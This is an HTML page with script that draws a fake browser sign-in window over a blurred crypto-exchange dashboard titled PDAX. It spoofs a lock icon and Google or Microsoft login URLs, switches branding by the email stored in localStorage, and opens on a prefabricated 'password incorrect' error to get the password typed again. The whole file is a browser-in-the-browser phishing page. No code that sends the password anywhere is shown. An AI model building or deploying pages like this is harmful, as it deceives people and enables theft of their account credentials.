<!DOCTYPE html>
<html lang="en-US">
<head>
<base target="_top" />
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>PDAX</title>
<style>
  * { box-sizing:border-box; }
  html,body { margin:0; height:100%; }
  body { font-family:"Poppins",system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif; background:#eef0f2; overflow:hidden; }

  /* Blurred dashboard mock behind the window */
  .bg { position:fixed; inset:0; filter:blur(7px); opacity:.22; pointer-events:none; padding:28px; }
  .bar { height:52px; background:#fff; border-radius:8px; margin-bottom:24px; box-shadow:0 1px 6px rgba(0,0,0,.05); }
  .cols { display:grid; grid-template-columns:1fr 1.4fr; gap:28px; max-width:1300px; margin:0 auto; }
  .card { background:#fff; border-radius:12px; box-shadow:0 1px 8px rgba(0,0,0,.05); padding:22px; }
  .pill { height:18px; width:60%; background:#e9ecef; border-radius:6px; margin-bottom:14px; }
  .pill.sm { width:35%; }
  .grid { display:grid; grid-template-columns:repeat(4,1fr); gap:18px; margin-top:18px; }
  .coin { text-align:center; }
  .dot { width:40px; height:40px; border-radius:50%; margin:0 auto 8px; }
  .g { background:#2bb24c; } .y { background:#f0b429; } .b { background:#3b82f6; } .o { background:#f97316; }
  .line { display:flex; align-items:center; gap:12px; padding:14px 0; border-bottom:1px solid #f0f1f3; }
  .line .dot { width:34px; height:34px; margin:0; }
  .line .txt { flex:1; }

  /* Browser-style window */
  .overlay { position:fixed; inset:0; display:flex; align-items:center; justify-content:center; padding:20px; }
  .win { background:#fff; width:100%; max-width:560px; height:660px; max-height:92vh; border-radius:10px; box-shadow:0 24px 70px rgba(0,0,0,.32); display:flex; flex-direction:column; overflow:hidden; }

  .titlebar { display:flex; align-items:center; gap:10px; padding:10px 14px; border-bottom:1px solid #eceef0; }
  .titlebar .ti { display:flex; }
  .titlebar .tt { flex:1; font-size:14px; color:#3c4043; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
  .wbtns { display:flex; gap:20px; color:#5f6368; }
  .wbtns span { font-size:15px; line-height:1; cursor:default; }

  .urlbar { display:flex; align-items:center; gap:8px; padding:9px 16px; border-bottom:1px solid #eceef0; }
  .urlbar .lock { color:#5f6368; display:flex; }
  .urlbar .url { font-size:13px; color:#3c4043; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }

  .progress { height:3px; background:transparent; overflow:hidden; }
  .progress.on::after { content:""; display:block; height:3px; width:40%; background:#1a73e8; animation:slide 1.1s infinite linear; }
  @keyframes slide { 0%{margin-left:-40%;} 100%{margin-left:100%;} }

  .content { flex:1; display:flex; flex-direction:column; padding:34px 44px; overflow:auto; }

  .connect { flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:18px; }
  .connect .logo { display:flex; }
  .connect .cspin { width:34px; height:34px; border-radius:50%; border:3px solid #e3e7ea; border-top-color:#1a73e8; animation:rot .9s linear infinite; }
  .connect .ctext { font-size:15px; color:#3c4043; }
  @keyframes rot { to { transform:rotate(360deg); } }

  .heading { font-size:24px; color:#202124; margin:0 0 20px; font-weight:400; }
  .proceed { font-size:14px; color:#5f6368; margin:0 0 12px; }

  /* editable account field */
  .acct-edit { display:flex; align-items:center; gap:8px; border:1px solid #dadce0; border-radius:40px; padding:7px 14px 7px 12px; margin-bottom:18px; }
  .acct-edit:focus-within { border-color:#1a73e8; box-shadow:0 0 0 1px #1a73e8; }
  .acct-edit input { border:0; outline:none; font-size:14px; color:#3c4043; flex:1; background:transparent; }

  .pwd { position:relative; margin-bottom:8px; }
  .pwd input { width:100%; padding:14px 46px 14px 15px; border:1px solid #80868b; border-radius:6px; font-size:16px; color:#202124; outline:none; }
  .pwd input.err { border-color:#d93025; }
  .pwd input:focus { border-color:#1a73e8; box-shadow:0 0 0 1px #1a73e8; }
  .eye { position:absolute; right:12px; top:50%; transform:translateY(-50%); background:none; border:0; cursor:pointer; color:#5f6368; padding:4px; display:flex; }

  .error { color:#d93025; font-size:13px; line-height:1.4; margin:4px 0 16px; display:flex; align-items:flex-start; gap:6px; }
  .error svg { flex:none; margin-top:1px; }

  .forgot { display:inline-block; font-size:14px; color:#1a73e8; text-decoration:none; font-weight:500; margin:6px 0 22px; cursor:pointer; }
  .legal { font-size:13px; line-height:1.6; color:#3c4043; margin:0 0 26px; }
  .legal a { color:#1a73e8; text-decoration:none; }
  .formfoot { display:flex; align-items:center; justify-content:space-between; margin-top:auto; }
  .create { font-size:14px; color:#1a73e8; text-decoration:none; font-weight:500; cursor:pointer; }
  .next { background:#1a73e8; color:#fff; border:0; border-radius:40px; padding:11px 26px; font-size:14px; font-weight:500; cursor:pointer; }
  .next:hover { background:#1b66c9; }

  .winfoot { display:flex; align-items:center; gap:26px; padding:12px 18px; border-top:1px solid #eceef0; font-size:13px; color:#5f6368; }
  .winfoot .sp { flex:1; }
  .winfoot a { color:#5f6368; text-decoration:none; cursor:default; }

  .hidden { display:none !important; }
</style>
</head>
<body>
  <div class="bg">
    <div class="bar"></div>
    <div class="cols">
      <div>
        <div class="card"><div class="pill"></div><div class="pill sm"></div></div>
        <div class="card" style="margin-top:20px;">
          <div class="grid">
            <div class="coin"><div class="dot g"></div><div class="pill" style="width:80%;margin:0 auto;height:10px;"></div></div>
            <div class="coin"><div class="dot g"></div><div class="pill" style="width:80%;margin:0 auto;height:10px;"></div></div>
            <div class="coin"><div class="dot y"></div><div class="pill" style="width:80%;margin:0 auto;height:10px;"></div></div>
            <div class="coin"><div class="dot g"></div><div class="pill" style="width:80%;margin:0 auto;height:10px;"></div></div>
            <div class="coin"><div class="dot b"></div><div class="pill" style="width:80%;margin:0 auto;height:10px;"></div></div>
            <div class="coin"><div class="dot o"></div><div class="pill" style="width:80%;margin:0 auto;height:10px;"></div></div>
            <div class="coin"><div class="dot g"></div><div class="pill" style="width:80%;margin:0 auto;height:10px;"></div></div>
          </div>
        </div>
      </div>
      <div class="card">
        <div class="pill sm"></div>
        <div class="line"><div class="dot g"></div><div class="txt"><div class="pill" style="height:12px;"></div></div></div>
        <div class="line"><div class="dot y"></div><div class="txt"><div class="pill sm" style="height:12px;"></div></div></div>
        <div class="line"><div class="dot b"></div><div class="txt"><div class="pill" style="height:12px;"></div></div></div>
        <div class="line"><div class="dot g"></div><div class="txt"><div class="pill sm" style="height:12px;"></div></div></div>
        <div class="line"><div class="dot g"></div><div class="txt"><div class="pill" style="height:12px;"></div></div></div>
      </div>
    </div>
  </div>

  <div class="overlay">
    <div class="win">
      <div class="titlebar">
        <span class="ti" id="winIcon"></span>
        <span class="tt" id="winTitle">Sign in</span>
        <span class="wbtns"><span>&#8211;</span><span>&#9633;</span><span>&#10005;</span></span>
      </div>
      <div class="urlbar">
        <span class="lock">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5zm-3 8V6a3 3 0 0 1 6 0v3H9z"/></svg>
        </span>
        <span class="url" id="winUrl"></span>
      </div>
      <div class="progress" id="prog"></div>

      <!-- STATE: password form (shown directly - this is the retry/correction screen) -->
      <div class="content" id="stForm">
        <h1 class="heading" id="formHeading">Sign in</h1>
        <p class="proceed">Proceed to</p>
        <div class="acct-edit">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="#5f6368"><circle cx="12" cy="8" r="4"/><path d="M12 14c-5 0-8 2.6-8 5v1h16v-1c0-2.4-3-5-8-5z"/></svg>
          <input id="acctEmail" type="email" placeholder="your email" autocomplete="off" />
        </div>
        <div class="pwd">
          <input id="pwd" class="err" type="password" placeholder="Enter your password" autocomplete="off" />
          <button class="eye" id="eye" type="button" aria-label="Show password">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/><line x1="3" y1="3" x2="21" y2="21"/></svg>
          </button>
        </div>
        <div class="error" id="errorMsg">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2L1 21h22L12 2zm0 14a1.2 1.2 0 1 1 0 2.4A1.2 1.2 0 0 1 12 16zm-1.1-7h2.2v5h-2.2V9z"/></svg>
          <span>The email or password you entered is incorrect. Please review your details and try again.</span>
        </div>
        <a class="forgot" id="forgot">Forgot email?</a>
        <p class="legal">Privacy Policy and the <a href="#">Terms of Service</a> of this app before using it.</p>
        <div class="formfoot">
          <a class="create" id="create">Create account</a>
          <button class="next" id="next" type="button">Next</button>
        </div>
      </div>

      <!-- STATE: connecting -->
      <div class="content connect hidden" id="stConnecting">
        <span class="logo" id="connLogo"></span>
        <div class="cspin"></div>
        <div class="ctext">Connecting</div>
      </div>

      <div class="winfoot">
        <a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a>
        <span class="sp"></span>
        <span>BR</span>
      </div>
    </div>
  </div>

  <script>
  (function () {
    var ICON = {
      google: '<svg width="20" height="20" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>',
      microsoft: '<svg width="18" height="18" viewBox="0 0 23 23"><path fill="#f35325" d="M1 1h10v10H1z"/><path fill="#81bc06" d="M12 1h10v10H12z"/><path fill="#05a6f0" d="M1 12h10v10H1z"/><path fill="#ffba08" d="M12 12h10v10H12z"/></svg>',
      generic: '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#5f6368" stroke-width="2"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 7l9 6 9-6"/></svg>'
    };
    var CONNLOGO = {
      google: '<svg width="86" height="64" viewBox="0 0 52 40"><path fill="#4285F4" d="M3.3 40h8.4V19.6L0 10.9v25.8C0 38.5 1.5 40 3.3 40z"/><path fill="#34A853" d="M40.3 40h8.4c1.8 0 3.3-1.5 3.3-3.3V10.9l-11.7 8.7V40z"/><path fill="#EA4335" d="M40.3 3.3v16.3L52 10.9V4.9c0-5.4-6.2-8.5-10.5-5.3L40.3 3.3z"/><path fill="#C5221F" d="M0 4.9v6l11.7 8.7V3.3L10.5-.4C6.2-3.6 0-.5 0 4.9z"/><path fill="#FBBC04" d="M11.7 3.3l14.3 10.7L40.3 3.3v16.3L26 30.3 11.7 19.6V3.3z"/></svg>',
      microsoft: '<svg width="80" height="64" viewBox="0 0 48 40"><path fill="#0F6CBD" d="M4 11h26a2 2 0 0 1 2 2v18a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V13a2 2 0 0 1 2-2z"/><ellipse cx="15" cy="22" rx="7" ry="8" fill="#fff"/><ellipse cx="15" cy="22" rx="3.3" ry="4.2" fill="#0F6CBD"/><path fill="#28A8EA" d="M32 15h12a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H32z"/><path fill="#0078D4" d="M32 15l14 8.5L32 32z" opacity=".35"/></svg>',
      generic: '<svg width="80" height="60" viewBox="0 0 24 24" fill="none" stroke="#5f6368" stroke-width="1.6"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M2 7l10 7 10-7"/></svg>'
    };
    var URLS = {
      google: 'https://accounts.google.com/v3/signin/identifier?gsiwebsdk=3&client_id=...',
      microsoft: 'https://login.live.com/login.srf?wa=wsignin1.0&client_id=...',
      generic: 'https://mail.sign-in/account/v3/identifier?client_id=...'
    };
    var WINTITLE = {
      google: 'Sign in to Google Accounts',
      microsoft: 'Sign in to your Microsoft account',
      generic: 'Sign in to your email'
    };
    var HEADING = {
      google: 'Sign in to Google Accounts',
      microsoft: 'Sign in to Microsoft account',
      generic: 'Sign in to your email'
    };

    function detect(email) {
      var d = (email.toLowerCase().split('@')[1] || '');
      if (d.indexOf('gmail') >= 0 || d.indexOf('googlemail') >= 0) return 'google';
      if (d.indexOf('outlook') >= 0 || d.indexOf('hotmail') >= 0 || d.indexOf('live') >= 0 || d.indexOf('msn') >= 0) return 'microsoft';
      return 'generic';
    }

    function applyProvider(p) {
      document.getElementById('winIcon').innerHTML = ICON[p];
      document.getElementById('winTitle').textContent = WINTITLE[p];
      document.getElementById('winUrl').textContent = URLS[p];
      document.getElementById('formHeading').textContent = HEADING[p];
      document.getElementById('connLogo').innerHTML = CONNLOGO[p];
    }

    // email from the login session (same as the rest of the app)
    var email = '';
    try { var s = localStorage.getItem('pdax_login_email'); if (s) email = s.trim(); } catch (e) {}
    var acct = document.getElementById('acctEmail');
    acct.value = email;              // pre-filled and editable
    applyProvider(detect(email));

    // re-detect provider when the user edits the email
    acct.addEventListener('input', function () {
      applyProvider(detect(acct.value.trim()));
    });

    // password visibility toggle
    var pwd = document.getElementById('pwd');
    document.getElementById('eye').addEventListener('click', function () {
      pwd.type = pwd.type === 'password' ? 'text' : 'password';
      pwd.focus();
    });
    // clear the error highlight once the user starts typing a new password
    pwd.addEventListener('input', function () {
      pwd.classList.remove('err');
      document.getElementById('errorMsg').style.display = 'none';
    });

    // Next -> connecting (stays here)
    var elForm = document.getElementById('stForm');
    var elConn = document.getElementById('stConnecting');
    var prog = document.getElementById('prog');
    document.getElementById('next').addEventListener('click', function () {
      prog.className = 'progress on';
      elForm.classList.add('hidden');
      elConn.classList.remove('hidden');
    });
  })();
  </script>
</body>
</html>
